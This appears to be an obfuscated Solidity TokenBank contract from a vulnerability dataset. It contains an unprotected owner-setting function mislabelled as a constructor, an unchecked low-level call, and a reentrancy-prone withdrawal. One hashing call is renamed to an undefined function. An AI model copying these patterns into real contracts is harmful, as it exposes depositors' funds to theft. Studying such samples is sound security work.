// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Ownable
{
    address _0xc9936b;
    address _0xd67474 = msg.sender;

    function _0x84e2c9(address _0x8370e4)
    public
    _0x634d0e
    {
        _0xc9936b = _0x8370e4;
    }

    function _0x2599ff()
    public
    {
        if(msg.sender==_0xc9936b)
        {
            _0xd67474=_0xc9936b;
        }
    }

    modifier _0x634d0e
    {
        if(_0xd67474 == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0xd67474 = msg.sender;
    function WithdrawToken(address _0x5f728e, uint256 _0xd7a277,address _0xda40c8)
    public
    _0x634d0e
    {
        _0x5f728e.call(bytes4(_0x6a7ced("transfer(address,uint256)")),_0xda40c8,_0xd7a277);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x0b01a7()
    public
    {
        _0xd67474 = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0xe93142,address _0xfa8759,uint _0x0774a1)
    public
    _0x634d0e
    {
        if(Holders[_0xe93142]>0)
        {
            Holders[_0xe93142]=0;
            WithdrawToken(_0xfa8759,_0x0774a1,_0xe93142);
        }
    }

    function WithdrawToHolder(address _0x98db54, uint _0x06693a)
    public
    _0x634d0e
    payable
    {
        if(Holders[_0x98db54]>0)
        {
            if(_0x98db54.call.value(_0x06693a)())
            {
                Holders[_0x98db54]-=_0x06693a;
            }
        }
    }
}